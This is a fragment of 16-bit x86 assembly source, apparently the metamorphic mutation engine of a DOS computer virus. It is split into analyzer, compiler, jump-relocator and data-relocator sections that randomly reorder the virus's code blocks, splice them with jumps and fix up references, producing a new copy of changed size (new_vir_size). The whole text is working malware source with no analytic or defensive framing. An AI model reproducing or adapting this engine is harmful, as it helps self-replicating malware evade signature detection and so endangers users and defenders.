;DEBUG_SIZES = 1

@last_rnd               EQU     2
@out_block_ofs          EQU     4
@jump_relo_ofs          EQU     6
@data_relo_ofs          EQU     8
@num_of_blocks          EQU     0ah
in_mem_ofs              EQU     0ch
new_vir_size            EQU     0eh

@in_block_table         EQU     0010h
@out_block_table        EQU     @in_block_table + 104h + 4
@jump_relo_table        EQU     @out_block_table + 1B0h
@data_relo_table        EQU     @jump_relo_table + 2e0h
@free                   EQU     @data_relo_table + 188h

                ;³                    ³;
                ;³      ANALYZER      ³;
                ;³                    ³;

I<      mov     word ptr es:[in_mem_ofs], 0                             >

I<      mov     word ptr es:[@out_block_ofs], @out_block_table          >
I<      mov     word ptr es:[@jump_relo_ofs], @jump_relo_table          >
I<      mov     word ptr es:[@data_relo_ofs], @data_relo_table          >

I<      lea     si, [bp + 1234h]                                        >
RELO    src_src
I<      push    si                                                      >
I<      mov     bx, @free                                               >
        JUMP    @compile

BLOCK   @compile
I<      mov     di, @in_block_table                                     >
I<      xor     ax, ax                                                  >
        JUMP    @next_in_block

BLOCK   @next_in_block
I<      add     si, ax                                                  >
        CALLL   read_byte
I<      or      al, al                                                  >
        _JZ     @end_in_block
I<      cmp     al, M_CODE                                              >
        _JAE    @code_cmd
I<      cmp     al, MAX_CODE_SIZE                                       >
        _JBE    @next_in_block
I<      sub     al, MAX_CODE_SIZE                                       >
        JUMP    @next_in_block

BLOCK   @code_cmd
I<      cmp     al, M_STOP                                              >
        _JNZ    @no_stop
I<      mov     al, 0                                                   >
        JUMP    @next_in_block

BLOCK   @no_stop
I<      cmp     al, M_BLOCK                                             >
        _JNZ    @no_block
I<      mov     ax, si                                                  >
I<      dec     ax                                                      >
I<      stosw                                                           >
I<      mov     ax, 0FFFFh                                              >
I<      stosw                                                           >
I<      mov     ax, 2                                                   >
        JUMP    @next_in_block

BLOCK   @no_block                                ;M_RELO & M_J*
I<      mov     al, 2                                                   >
        JUMP    @next_in_block

BLOCK   @end_in_block
I<      lea     ax, [di + (-(@in_block_table))]                         >
ifdef   DEBUG_SIZES
I<      int 3                                                           >
endif
I<      shr     ax, 1                                                   >
I<      shr     ax, 1                                                   >
I<      mov     es:[@num_of_blocks], ax                                 >
I<      xor     ax, ax                                                  >
I<      stosw                                                           >

                ;³                    ³;
                ;³      COMPILER      ³;
                ;³                    ³;

I<      mov     di, @in_block_table                                     >
I<      mov     si, es:[di]                                             >
        JUMP    @no_stoped

BLOCK   @next_block
I<      push    bp                                                      >
I<      mov     bp, es:[@num_of_blocks]                                 >
        CALLL   @rnd_max
I<      pop     bp                                                      >
I<      shl     ax, 1                                                   >
I<      shl     ax, 1                                                   >
I<      add     ax, @in_block_table                                     >
I<      mov     di, ax                                                  >
        JUMP    @next_search_block

BLOCK   @next_search_block
I<      add     di, 4                                                   >
I<      mov     si, es:[di]                                             >
I<      or      si, si                                                  >
        _JNZ    @no_last_block
I<      mov     di, @in_block_table                                     >
I<      mov     si, es:[di]                                             >
        JUMP    @no_last_block

BLOCK   @no_last_block
I<      push    ax                                                      >
        CALLL   read_byte
I<      dec     si                                                      >
I<      cmp     al, M_STOP                                              >
I<      pop     ax                                                      >
        _JNZ    @no_stoped
I<      cmp     di, ax                                                  >
        _JNZ    @next_search_block
        JUMP    @no_next_block

BLOCK   @no_stoped
I<      mov     ax, es:[di+2]                                           >
I<      cmp     ax, 0FFFFh                                              >
        _JZ     @next_inst

I<      push    di                                                      >
I<      mov     di, ax                                                  >
I<      mov     al, 0e9h                                                >
I<      stosb                                                           >
I<      mov     ax, bx                                                  >
I<      dec     ax                                                      >
I<      dec     ax                                                      >
I<      sub     ax, di                                                  >
I<      stosw                                                           >
I<      pop     di                                                      >
        JUMP    @next_inst

BLOCK   @next_inst
        CALLL   read_byte
I<      cmp     al, M_STOP                                              >
        _JZ     @no_next_inst

I<      cmp     al, MAX_CODE_SIZE                                       >
        _JA     @no_break

I<      push    ax                                                      >
I<      push    bp                                                      >
I<      mov     bp, [bp + 1234h]                                        >
RELO    @JMPS
        CALLL   @rnd_max
I<      or      ax, ax                                                  >
I<      pop     bp                                                      >
I<      pop     ax                                                      >
        _JZ     @no_last_but_end
        JUMP    @no_break

BLOCK   @no_break
I<      cmp     al, M_STOP                                              >
        _JZ     @no_next_inst
I<      cmp     al, M_CODE                                              >
        _JAE    @code_cmd1
I<      cmp     al, MAX_CODE_SIZE                                       >
        _JBE    @no_sub_size_data
I<      sub     al, MAX_CODE_SIZE                                       >
        JUMP    @no_sub_size_data

BLOCK   @no_sub_size_data
I<      xor     cx, cx                                                  >
I<      mov     cl, al                                                  >
I<      push    di                                                      >
I<      mov     di, bx                                                  >
        JUMP    @copy_next_byte

BLOCK   @copy_next_byte
        CALLL   read_byte
I<      stosb                                                           >
I<      dec     cx                                                      >
        _JNZ    @copy_next_byte
I<      mov     bx, di                                                  >
I<      pop     di                                                      >
        JUMP    @next_inst

BLOCK   @code_cmd1
I<      cmp     al, M_RELO                                              >
        _JNZ    @no_relo1

I<      push    di                                                      >
I<      mov     di, es:[@data_relo_ofs]                                 >
I<      mov     ax, bx                                                  >
I<      dec     ax                                                      >
I<      dec     ax                                                      >
I<      stosw                                                           >
        CALLL   read_word
I<      stosw                                                           >
I<      mov     es:[@data_relo_ofs], di                                 >
I<      pop     di                                                      >
        JUMP    @next_inst

BLOCK   @no_relo1
I<      cmp     al, M_BLOCK                                             >
        _JNZ    @no_block1

I<      push    di                                                      >
I<      mov     di, es:[@out_block_ofs]                                 >
I<      mov     ax, bx                                                  >
I<      stosw                                                           >
        CALLL   read_word
I<      stosw                                                           >
I<      mov     es:[@out_block_ofs], di                                 >
I<      cmp     ax, src_src                                             >
        _JNZ    @no_put_src

I<      push    si                                                      >
I<      mov     di, bx                                                  >
I<      lea     si, [bp + 1234h]                                        >
RELO    src_src
I<      mov     cx, offset src_end - offset src                         >
I<      rep     movsb                                                   >
I<      mov     bx, di                                                  >
I<      pop     si                                                      >
        JUMP    @no_special

BLOCK   @no_put_src
I<      cmp     ax, text_text                                           >
        _JNZ    @no_put_text

I<      mov     ax, NO_TEXT                                             >
I<      cmp     word ptr [bp + 1234h], ax                               >
RELO    @JMPS
        _JAE    @no_special
        CALLL   read_byte
I<      sub     al, MAX_CODE_SIZE                                       >
I<      mov     ah, 0                                                   >
I<      add     si, ax                                                  >
        JUMP    @no_special

BLOCK   @no_put_text
I<      cmp     ax, @JMPS                                               >
        _JNZ    @no_special
I<      mov     ax, [bp + 1234h]                                        >
RELO    @JMPS
I<      dec     ax                                                      >
I<      cmp     ax, MIN_JMPS                                            >
        _JAE    jmps_no_over
I<      mov     ax, MAX_JMPS                                            >
        JUMP    jmps_no_over

BLOCK   jmps_no_over
I<      mov     es:[bx], ax                                             >
I<      add     bx, 2                                                   >
I<      add     si, 3                                                   >
        JUMP    @no_special

BLOCK   @no_special
I<      pop     di                                                      >
        CALLL   read_byte
        JUMP    @no_break

BLOCK   @no_block1                               ;M_J*
I<      push    ax                                                      >
I<      push    di                                                      >
I<      mov     di, es:[@jump_relo_ofs]                                 >
I<      mov     ax, bx                                                  >
I<      stosw                                                           >
        CALLL   read_word
I<      stosw                                                           >
I<      mov     es:[@jump_relo_ofs], di                                 >
I<      pop     di                                                      >
I<      pop     ax                                                      >
I<      mov     es:[bx], al                                             >
I<      add     bx, 3                                                   >
I<      cmp     al, M_J_COND                                            >
        _JB     @next_inst
I<      inc     bx                                                      >
I<      inc     bx                                                      >
        JUMP    @next_inst

BLOCK   @no_last_but_end
I<      mov     es:[di+2], bx                                           >
I<      add     bx, 3                                                   >
        JUMP    @no_next_inst

BLOCK   @no_next_inst
I<      dec     si                                                      >
I<      mov     es:[di], si                                             >
        JUMP    @next_block

BLOCK   @no_next_block
I<      cmp     word ptr es:[in_mem_ofs], 0                             >
        _JNZ    @link
I<      pop     si                                                      >
I<      mov     es:[in_mem_ofs], bx                                     >
I<      add     si, offset src_vir - offset src_startup                 >
        JUMP    @compile

                ;³                      ³;
                ;³    JUMP RELOCATOR    ³;
                ;³                      ³;

BLOCK   @link
I<      push    es                                                      >
I<      pop     ds                                                      >
I<      sub     bx, @free                                               >
I<      mov     ds:[new_vir_size], bx                                   >

I<      mov     si, @jump_relo_table                                    >
I<      mov     cx, ds:[@jump_relo_ofs]                                 >
I<      sub     cx, si                                                  >
ifdef   DEBUG_SIZES             ;check out_block in es:[4]
I<      int 3                                                           >
endif
I<      shr     cx, 1                                                   >
I<      shr     cx, 1                                                   >
        JUMP    @next_jump_relo

BLOCK   @next_jump_relo
I<      lodsw                                                           >
I<      push    ax                                                      >
I<      lodsw                                                           >
I<      push    cx                                                      >
I<      push    si                                                      >

I<      mov     si, @out_block_table                                    >
I<      mov     cx, ds:[@out_block_ofs]                                 >
I<      sub     cx, si                                                  >
I<      shr     cx, 1                                                   >
I<      shr     cx, 1                                                   >
        JUMP    @next_jmp_in_out

BLOCK   @next_jmp_in_out
I<      cmp     ax, [si + 2]                                            >
        _JZ     @jmp_found
I<      add     si, 4                                                   >
I<      dec     cx                                                      >
        _JNZ    @next_jmp_in_out

ifdef   DEBUG
I<      mov     bp, 0DEEDh                                              >
I<      int 3                                                           >
endif

BLOCK   @jmp_found
I<      mov     dx, [si]                                                >
I<      pop     si                                                      >
I<      pop     cx                                                      >
I<      pop     bx                                                      >
I<      mov     al, [bx]                                                >
I<      cmp     al, M_J_COND                                            >
        _JB     @jmp1

I<      sub     byte ptr [bx], 0F0h - 070h                              >
I<      inc     bx                                                      >
I<      push    dx                                                      >
I<      sub     dx, bx                                                  >
I<      dec     dx                                                      >
I<      cmp     dx, 127                                                 >
        _JG     @over_jmp
I<      cmp     dx, -128                                                >
        _JL     @over_jmp
I<      mov     [bx], dl                                                >
I<      inc     bx                                                      >
I<      mov     word ptr [bx], 09090h                                   >
I<      mov     byte ptr [bx+2], 090h                                   >
I<      pop     dx                                                      >
        JUMP    @next_j_relo

BLOCK   @over_jmp
I<      pop     dx                                                      >
I<      dec     bx                                                      >
I<      xor     byte ptr [bx], 1                                        >
I<      inc     bx                                                      >
I<      mov     byte ptr [bx], 3                                        >
I<      inc     bx                                                      >
I<      mov     al, 0E9h                                                >
        JUMP    @jmp1

BLOCK   @jmp1
I<      mov     byte ptr [bx], al                                       >
I<      inc     bx                                                      >
I<      sub     dx, bx                                                  >
I<      dec     dx                                                      >
I<      dec     dx                                                      >
I<      mov     [bx], dx                                                >
        JUMP    @next_j_relo

BLOCK   @next_j_relo
I<      dec     cx                                                      >
        _JNZ    @next_jump_relo

                ;³                      ³;
                ;³    DATA RELOCATOR    ³;
                ;³                      ³;

I<      mov     si, @data_relo_table                                    >
I<      mov     cx, ds:[@data_relo_ofs]                                 >
I<      sub     cx, si                                                  >
ifdef   DEBUG_SIZES
I<      int 3                                                           >
endif
I<      shr     cx, 1                                                   >
I<      shr     cx, 1                                                   >
        JUMP    @next_data_relo

BLOCK   @next_data_relo
I<      lodsw                                                           >
I<      push    ax                                                      >
I<      lodsw                                                           >
I<      push    cx                                                      >
I<      push    si                                                      >

I<      mov     si, @out_block_table                                    >
I<      mov     cx, ds:[@out_block_ofs]                                 >
I<      sub     cx, si                                                  >
I<      shr     cx, 1                                                   >
I<      shr     cx, 1                                                   >
        JUMP    @next_data_in_out

BLOCK   @next_data_in_out
I<      cmp     ax, [si + 2]                                            >
        _JZ     @found
I<      add     si, 4                                                   >
I<      dec     cx                                                      >
        _JNZ    @next_data_in_out

ifdef   DEBUG
I<      mov     bp, 0DEADh                                              >
I<      int 3                                                           >
endif

BLOCK   @found
I<      mov     ax, [si]                                                >
I<      pop     si                                                      >
I<      pop     cx                                                      >
I<      pop     bx                                                      >
I<      sub     ax, @free                                               >
I<      mov     [bx], ax                                                >
I<      dec     cx                                                      >
        _JNZ    @next_data_relo
        JUMP    end_of_compile
